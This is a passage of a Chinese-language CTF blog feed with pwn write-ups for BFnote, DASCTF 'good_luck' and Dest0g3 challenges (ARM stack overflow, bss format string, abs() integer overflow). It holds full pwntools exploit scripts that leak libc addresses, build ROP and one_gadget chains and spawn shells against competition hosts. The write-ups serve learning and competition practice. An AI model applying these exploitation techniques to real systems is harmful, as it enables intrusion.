class="string">&quot;invalid ! please re-enter :\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x18</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;\nGive your title : &quot;</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give your note : &quot;</span>,p32(<span class="number">0xdeadbeef</span>))<span class="comment">#canary</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span class="string">&quot;\x40&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281741828.png" alt="image-20221128174103440"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/countfatcode/p/12425168.html">i春秋公益赛之BFnote - countfatcode - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>栈迁移</tag>
        <tag>篡改got表</tag>
        <tag>篡改TLS中stack_guard</tag>
        <tag>绕过canary</tag>
        <tag>magic gadget</tag>
      </tags>
  </entry>
  <entry>
    <title>good_luck_2022DASCTF Apr X FATE 防疫挑战赛</title>
    <url>/posts/3aec74c5.html</url>
    <content><![CDATA[<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>通过这道题的学习与收获有：</p>
<p>1、学习了格式化字符串漏洞中的%s泄露函数地址原理以及roderick师傅写的Libcbox的用法（其实用法也很简单了），之后就没什么了直接ret2libc就打了。</p>
<p>2、这道赛题最后只有三解… 不过真的很简单，做出来的人很少的原因估计是因为这道题是比赛还有不到两个小时结束，才把正确的程序放出来（之前放的都是错误的…）。</p>
<span id="more"></span>

<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220424083159297-1342905454.png"></p>
<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="/../img/2706180-20220424083208729-652924904.png"></p>
<p><img src="/../img/2706180-20220424083214353-1731248574.png"></p>
<p>程序逻辑非常简单，刚开始是time加srand加rand。看一下汇编代码发现没有办法覆盖种子，因此这里生成的就是一个不可控随机数。比赛刚开始的时候，程序放出来的是rand%200，因此进入fmt和overflow函数还需要进行爆破。不过现在这个就非常简单了，要么随机数是0要么随机数是1,0进入overflow,1进入fmt函数。</p>
<p><img src="/../img/2706180-20220424083219157-376928583.png"></p>
<p>发现这两个函数都存在溢出，并且fmt函数中存在格式化字符串漏洞。由于程序没有开canary。那直接ret2libc？这样的话这个格式化字符串漏洞岂不是就没有意义了？先不管这么多，脚本写了再说。</p>
<p>写完之后发现打不通（之前写ret2libc的脚本给删了，这里就不再呈现了），通过调试发现，pop rdi的地址中出现了0a，把输出给截断了… 这意味着我们无法使用程序里的pop rdi。这样的话就没法泄露函数（毕竟我们连rdi寄存器都控制不了）</p>
<p>然后考虑一下给的格式化字符串漏洞，我们可以用它来泄露栈中存放的函数真实地址，利用溢出来劫持程序执行流。</p>
<p>泄露的话有两种方法，第一种是用%p泄露，第二种是用%s泄露。之前一直不清楚它们的区别，请教了roderick师傅之后总算是清楚了。</p>
<p>以printf(“%s”，”aaaa”)为例 	printf的第二个参数装的并不是aaaa这四个字符，而是aaaa字符串的首地址。可是最后打印出来的并不是aaaa字符串的首地址，而是这个地址所指向的字符串。由此可以推断出，%s有寻址的功能。</p>
<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><p>思路重新回到泄露栈中的函数真实地址，先说第一种%p进行泄露。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011930888.png" alt="image-20230701193042518"></p>
<p>栈顶偏移25(0x13+6),因此直接%25$p即可。不过这样泄露出来的地址还需要减去362，因为现在得到的是puts+362，而我们仅仅要的是puts的真实地址。这样的缺点就是程序patch不同的libc，这个偏移是不一样的。以本题为例，题目并没有给出libc.so因此这个偏移我们是无法确定的(现在看到的只是我们本地的偏移，远程可能并不一样)。</p>
<p>不过这个方法有一定的运气成分在这里面，我猜这个版本不会太高（我本机是2.27的，当时本地通了远程没通，就知道肯定是libc patch的有问题），就从2.23开始patch libc。结果patch第一个2.23-0ubuntu11.3_amd64就被我给猜对了（服务器那边用的也是这个libc）。</p>
<p>这个libc蒙对之后，由于基地址也泄露出来了，剩下的就简单多了，本地怎么打，远程就怎么打(不过讲这个方法感觉没什么意义，毕竟这是靠运气（不过如果远程给了Libc的话这个方法是可以用的）主要我确实是用这个方法打通了，因此记录一下)</p>
<h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    p = remote(<span class="string">&#x27;39.99.242.16&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;/home/hacker/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line">    fmt_addr = <span class="number">0x400836</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;fmt\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;%25$p&#x27;</span> + (<span class="number">0x78</span> - <span class="number">5</span>) * <span class="string">&#x27;a&#x27;</span> + p64(fmt_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_addr1---------------&gt;&#x27;</span>, <span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    libc_base = leak_addr - <span class="number">362</span> - <span class="number">0x6F6A0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">    pop_rdi_addr = <span class="number">0x21112</span> + libc_base</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    ret = <span class="number">0x400679</span></span><br><span class="line">    payload = <span class="number">0x78</span> * <span class="string">&#x27;b&#x27;</span></span><br><span class="line">    payload+=p64(ret)+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(sys_addr)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
<p>这个打通概率是二分之一，因为如果第一次进到overflow就不通了。<br><img src="/../img/2706180-20220424083229618-61437671.png"></p>
<p>第二种用%s来泄露就靠谱多了，我们在栈中布置puts的got地址，利用%s的寻址特征，来达到直接泄露puts的真实地址（也就是不会再受libc版本导致偏移不同的影响），依旧利用溢出来劫持程序执行流。</p>
<p>只需要输入%7$saaaa’ + p64(puts_got_addr)然后填垃圾数据垫到返回地址处劫持执行流即可。</p>
<p>这里泄露是很方便，但是我用LibcSearcher搜不到对应正确的libc版本。可以用<a href="https://libc.blukat.me/?q=puts:680&l=libc6-amd64_2.10.1-0ubuntu15_i386">在线搜libc的网站搜</a>对应的Libc版本</p>
<p>也可以用Roderick师傅写的<a href="https://github.com/RoderickChan/pwncli">pwncli</a>中的LibcBox来搜，这个LibcBox写的确实很棒</p>
<p>下面是LibcBox搜索的效果图</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011931110.png" alt="image-20230701193129729"></p>
<p>它搜到了十个版本的libc，但是LibcSearcher我记的仅仅是搜到了三个（不排除是我的LibcSearcher有问题）。</p>
<p>泄露出了libc基地址，那就随便打了，不过好像没法搜pop_rdi这个指令（不过可以把libc下载下来用Ropgadget来搜，不过有点麻烦），就直接用one_gadget打了(pwncli这个库模式只支持python3)</p>
<h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    p = remote(<span class="string">&#x27;39.99.242.16&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">    over_flow = <span class="number">0x400836</span></span><br><span class="line">    puts_got_addr = <span class="number">0x601018</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;fmt\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;%7$saaaa&#x27;</span> + p64(puts_got_addr) + (<span class="number">0x78</span> - <span class="number">16</span>) * <span class="string">b&#x27;a&#x27;</span> + p64(over_flow)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#用%s泄露出来的地址应该用u64来接收</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;puts_addr---------------&gt;&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    lb = LibcBox()</span><br><span class="line">    lb.add_symbol(<span class="string">&#x27;puts&#x27;</span>, puts_addr)<span class="comment">#这个地方跟libcsearcher用法基本一样，下面也是去dump出来</span></span><br><span class="line">    lb.search(download_so=<span class="number">1</span>)</span><br><span class="line">    libc_base = puts_addr - lb.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    one_addr = <span class="number">0xf03a4</span> + libc_base</span><br><span class="line">    payload = <span class="number">0x78</span> * <span class="string">b&#x27;b&#x27;</span> + p64(one_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>one_gadget</tag>
        <tag>格式化字符串漏洞</tag>
        <tag>栈对齐</tag>
      </tags>
  </entry>
  <entry>
    <title>Dest0g3 520迎新赛--栈题write_up</title>
    <url>/posts/4354d4bf.html</url>
    <content><![CDATA[<h2 id="ez-aarch"><a href="#ez-aarch" class="headerlink" title="ez_aarch"></a>ez_aarch</h2><p>考察的是最简单的arm架构的栈溢出。</p>
<span id="more"></span>

<h3 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h3><img src="https://s2.loli.net/2022/05/27/wCtDTAO95cxIy61.png" alt="image-20220524111202855" style="zoom: 67%;" />

<p>关于arm架构是怎么启动程序和调试的，可以参考一下我的这篇<a href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">博客</a></p>
<img src="https://s2.loli.net/2022/05/27/hEBHxi1TcwblWUr.png" alt="image-20220524113235409" style="zoom:50%;" />

<p>这里存在溢出，同时题目给了后面，并且很巧合的没开canary，因此这就是最简单的栈溢出题目，不过考虑到这是arm架构的题目跟x86的函数调用还不太一样，没法一眼就看出它的返回地址，需要调试一下。</p>
<p><img src="https://s2.loli.net/2022/05/27/oMrNmXEPvBVdSeh.png" alt="image-20220524124829771"></p>
<p>先用cyclic生成48个字符，然后下个断点到0x40000009c8，c过去看一下崩溃的信息。</p>
<p><img src="https://s2.loli.net/2022/05/27/liJ8YSZTKU7Ep4B.png" alt="image-20220524125046601"></p>
<p>发现是在kaaalaaa这里崩溃了（因为此时的x30寄存器就是这个值），所以我们只需要把这个地方的内容换成后门函数的地址即可。由于开了PIE，我们无法写入后面函数整个的地址，不过可以只写后门函数的最后一字节，写个0x3c即可。</p>
<p><img src="https://s2.loli.net/2022/05/27/oUrikO5lxtX34eD.png" alt="image-20220524125339086"></p>
<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./stack&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28710</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">payload=<span class="number">40</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;&lt;&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<img src="https://s2.loli.net/2022/05/27/Nd52ZPUytiEfYrb.png" alt="image-20220524125717811" style="zoom: 67%;" />



<h2 id="dest-love"><a href="#dest-love" class="headerlink" title="dest_love"></a>dest_love</h2><p>总结：</p>
<p>1、考察的bss段上的格式化字符串漏洞，这道题属于最简单的布置栈链</p>
<p>2、以后做题之前尽量把libc版本找正确了，这道题的libc试了半天最后试出来了，结果做出来之后发现公告上写了是ubuntu21.04，不然还能做的更快。</p>
<h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><img src="https://s2.loli.net/2022/05/27/VxYJs8WM9wqFRQN.png" alt="image-20220524130642814" style="zoom: 67%;" />

<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><img src="https://s2.loli.net/2022/05/27/J4TjCPa8QM5fgOS.png" alt="image-20220524130844091" style="zoom: 67%;" />

<p>考察的格式化字符串漏洞，同时存在后门函数。</p>
<p>目前掌握的信息是，格式化字符串漏洞只能用6次，同时format是输入到了bss段，开了PIE。</p>
<h3 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h3><p>因为这道题是bss段的格式化字符串，因此需要布置栈链来做，关于栈链的布置可以参考我的这篇<a href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">博客</a></p>
<p>不过在这之前这道题有一个很恶心的地方，就是需要猜一下libc（其实也不用猜，公告里给了ubuntu21.04的版本）不过我当时做题的时候没有看公告，然后就一个一个试了一下，试的方法就是nc连接到服务器那边的程序，然后输入很多个%p，看一下泄露数据能否和本地的数据类型对应（比如远程栈顶偏移8的位置是个libc中地址，当本地的栈顶偏移8的位置也是个libc地址就算是对应）</p>
<p>最后试出来是2.33的libc。在ubuntu21.04的docker里跑一下。（如果初步学习怎么使用docker的可以看这篇<a href="https://www.cnblogs.com/ZIKH26/articles/16278170.html">文章</a>)</p>
<h3 id="调试过程："><a href="#调试过程：" class="headerlink" title="调试过程："></a>调试过程：</h3><p>在布置栈链之前，先去泄露一下我们需要的地址，<strong>对抗PIE需要用程序基地址，布置栈链需要用栈地址</strong>，调试一下，看看栈里的数据。</p>
<p>下面是执行printf时的栈中情况。</p>
<p><img src="https://s2.loli.net/2022/05/27/VUkdBPYgJuftAzZ.png" alt="image-20220524190605046"></p>
<p>由此可以获取所需地址的偏移，分别是4和8（不过需要加上6个寄存器），泄露出来之后，减去对应的偏移，即可获取程序基地址和所需栈地址。</p>
<p>接下来就是布置栈链。</p>
<p>先在栈中找一个栈地址（这个栈地址需要再指向一个栈地址），<strong>很明显符合这个条件的是栈顶偏移4的位置</strong>，由于我们的目的是在这个地方写入这个值（见下图）</p>
<p><img src="https://s2.loli.net/2022/05/27/zUnZm6B8Q1fDTrp.png" alt="image-20220524191227999"></p>
<p>所以需要把这个dword_4010写到栈里。考虑到程序基地址和偏移8的栈中内容的前四字节一样，因此利用一下偏移8的数据，先将偏移4的内容指向的值去修改为偏移8的栈地址。</p>
<img src="https://s2.loli.net/2022/05/27/32oN5BtSmJwz6qD.png" alt="image-20220524194519354" style="zoom: 67%;" />

<img src="https://s2.loli.net/2022/05/27/gQbT3v5t4nJlsLI.png" alt="image-20220524194437287" style="zoom: 67%;" />

<p>此时再通过0x7ffcc75c1504这个地址来修改其指向的值，只需要更改低两字节即可。</p>
<pre><code>    此时可以看见，我们已经把我们要修改内容的地址给写到栈里了。
</code></pre>
<p>接下来，在距离栈顶偏移8这个位置直接写入要修改的数据即可。</p>
<p>这个属于最简单的布置栈链了，如果熟悉整体流程的话，应该做起来还是比较轻松的。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p>直接复制粘贴这个exp，是打不通的，因为我写了几个函数，放到了tools这个库里面，如果想用下面这个脚本获取shell的话，需要复制粘贴<a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">这里的源码</a>新建一个名为tools的py文件。或者把from tools import *以及debug和log函数这些出现的地方给注释掉也行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1210</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,<span class="string">&#x27;%14$p%10$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">base_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1270</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">stack_leak=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">stack_hook=(stack_leak&amp;<span class="number">0xffff</span>)-<span class="number">0xc8</span></span><br><span class="line"></span><br><span class="line">log(<span class="string">&#x27;base_addr&#x27;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line">log(<span class="string">&#x27;stack_leak&#x27;</span>,<span class="built_in">hex</span>(stack_leak))</span><br><span class="line">dest_addr=base_addr+<span class="number">0x4010</span></span><br><span class="line">log(<span class="string">&#x27;dest_addr&#x27;</span>,<span class="built_in">hex</span>(dest_addr))</span><br><span class="line"></span><br><span class="line">log(<span class="string">&#x27;stack_hook&#x27;</span>,<span class="built_in">hex</span>(stack_hook))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_hook)+<span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,payload)</span><br><span class="line">back_door=(base_addr+<span class="number">0x4010</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(back_door)+<span class="string">&#x27;c%39$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%1314520c%14$n&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://s2.loli.net/2022/05/27/2B3Osle1RNzFM5o.png" alt="image-20220524195121599" style="zoom: 67%;" />

<h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>1、通过这道题对原码和补码有了更深的认识，负数的值&#x3D;对应补码-(1&lt;&lt;32) （32位程序）</p>
<p>2、abs函数是有漏洞的，int类型的范围是-2147483648~ 2147483647 ，这就意味着abs将-2147483648转化为对应的正数是找不到对应的值，就会出现问题。</p>
<h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><img src="https://s2.loli.net/2022/05/27/qUpHdgolmKDJTke.png" alt="image-20220524224426473" style="zoom: 67%;" />

<h3 id="程序分析：-1"><a href="#程序分析：-1" class="headerlink" title="程序分析："></a>程序分析：</h3><img src="https://s2.loli.net/2022/05/27/NA3umiPhdfqplJF.png" alt="image-20220524225032285" style="zoom: 67%;" />

<p>我最开始分析题目的时候，确实没找到漏洞，因为没开canary，我总感觉这道题是能溢出的，然后又一点一点的仔细分析，发现还是没啥毛病，但是根据经验来看，一般感觉没漏洞的时候，漏洞就出现在不太了解的新东西上面。这道题的漏洞点在这个abs函数上，下面来仔细分析一下abs函数漏洞产生的原理。</p>
<h3 id="abs函数漏洞分析"><a href="#abs函数漏洞分析" class="headerlink" title="abs函数漏洞分析"></a>abs函数漏洞分析</h3><p>abs函数源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>        abs</span></span><br><span class="line"><span class="comment">/* Return the absolute value of I.  */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">abs</span> <span class="params">(<span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> i &lt; <span class="number">0</span> ? -i : i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>abs函数的作用就是取绝对值，也就是将负数转换为正数。但是int类型的范围是多少？-2147483648~ 2147483647 这就是int的范围，<strong>可是这个范围不对称，这就意味着使用abs函数，输入-2147483648 它就找不到对应的正值</strong>。当abs函数执行时就会将-2147483648的负号去掉，不过去掉负号之后是2147483648，而int类型的范围里压根就没有这个数字。如果实践一下就会发现-2147483648的绝对值还是-2147483648。</p>
<h3 id="大致思路：-1"><a href="#大致思路：-1" class="headerlink" title="大致思路："></a>大致思路：</h3><p>因此思路就出来了，输入-2147483648 ，经过abs()函数后，返回的依旧是-2147483648 ，可以绕过<code>if ( (int)abs32(v2) &gt; 10 )</code>和<code>if ( v4 &gt;= v2 )</code>两个检查（为啥能绕过第二个检查？因为v4和v2都是无符号整数，v2存储的值就是0x80000000，所以v4是肯定比v2小，继而绕过检查），从而可以不断的触发<code>__isoc99_scanf(&quot;%d&quot;, &amp;v1[v4++]);</code>这行代码，v4的索引没有限制因此这里就是溢出点，让v4足够大，正好指向栈里v4的值，然后去修改v4的值，让其指向返回地址。接着就可以篡改返回地址了，剩下的就是ret2libc，劫持程序执行流再来一遍，最终获取shell。</p>
<p>其实这道题调试一下还是比较简单的，我就放几张图片说明一下过程吧。</p>
<p>下图是正在溢出<br><img src="https://s2.loli.net/2022/05/27/rbFmHDZNL4It7Q5.png" alt="image-20220525224818058" style="zoom: 67%;" /></p>
<p><img src="https://s2.loli.net/2022/05/27/jPh2AinCrUdqYkH.png" alt="image-20220525224936710"></p>
<p><img src="https://s2.loli.net/2022/05/27/CR3lwfp8qysodVN.png" alt="image-20220525225022664"></p>
<p>此时的v4这个偏移就让&amp;v1[v4++]指向了返回地址，然后修改返回地址（如下图）</p>
<p><img src="https://s2.loli.net/2022/05/27/XzZSq78doOAmspi.png" alt="image-20220525225403369"></p>
<p>接着把返回地址和参数写入，ret2libc即可。</p>
<h3 id="libc中地址无法直接写入内存中"><a href="#libc中地址无法直接写入内存中" class="headerlink" title="libc中地址无法直接写入内存中"></a>libc中地址无法直接写入内存中</h3><p>后面的过程就不再演示了，最后唯一的一个坑就是写入system地址和&#x2F;bin&#x2F;sh地址时，由于32位程序libc中的地址是0xf7开头，但是这个数据太大了，不能直接用scanf(%d,&amp;a)写入进去。</p>
<p>剖析一下原理：</p>
<blockquote>
<p>由于scanf会对输入的内容进行过滤，只要是正数，那么存到内存里的最大就是0x7fffffff（因为符号位是不能表示大小的），假如现在想存入0xf7123456，我们来倒推一下（先不管它是咋输入进去的，假设它直接存在于内存中），内存中存放的0xf7123456对应二进制就是1111 0111 0001 0010 0011 0100 0101 0110。</p>
<p>我们来求一下他真正的值，发现符号位是1，因此判断其为负数，然后要减一，接着对整体取反，最后表示为0000 1000 1110 1101 1100 1011 1010 1010 对应16进制为0x8EDCBAA 因为它当成的补码符号位为1，因此它真正的值是-0x8EDCBAA。</p>
<p>而最终放到返回地址里的值，我们可不管输入的时候是个什么玩意，反正结果是要让他存储时为0xf7123456，因此我们选择输入-0x8EDCBAA即可</p>
<p>一句话总结就是：输入的负数存储到内存里时，它的补码是可以超过0x7fffffff的限制，从而可以实现写入0xf7这种更大的值。</p>
</blockquote>
<p>观察一下0xf7123456和-0x8EDCBAA之间有什么规律没有，很明显如果用0x100000000减去0xf7123456，得到的就是0x8EDCBAA，换个位置让0xf7123456减去0x100000000，自然得到的就是-0x8EDCBAA。</p>
<p>负值&#x3D;对应补码-0x100000000(32位程序) 这个式子在magic gadget中算偏移为负的时候也出现过。</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p>PS:直接复制粘贴我这个脚本是打不通的，因为里面出现了我自己定义的函数，如果想使用下面的脚本，需要复制粘贴<a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">这里的源码</a>新建一个名为tools的py文件。或者把出现的我自定义的函数注释掉，换回正常的代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./ez_pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27271</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,0x0804930D)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;-2147483800&#x27;</span>)</span><br><span class="line">a=<span class="number">4369</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(a+i))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">17</span>))</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x08049408</span></span><br><span class="line">log(<span class="string">&#x27;puts_plt_addr&#x27;</span>,(puts_plt_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(puts_plt_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(main_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span 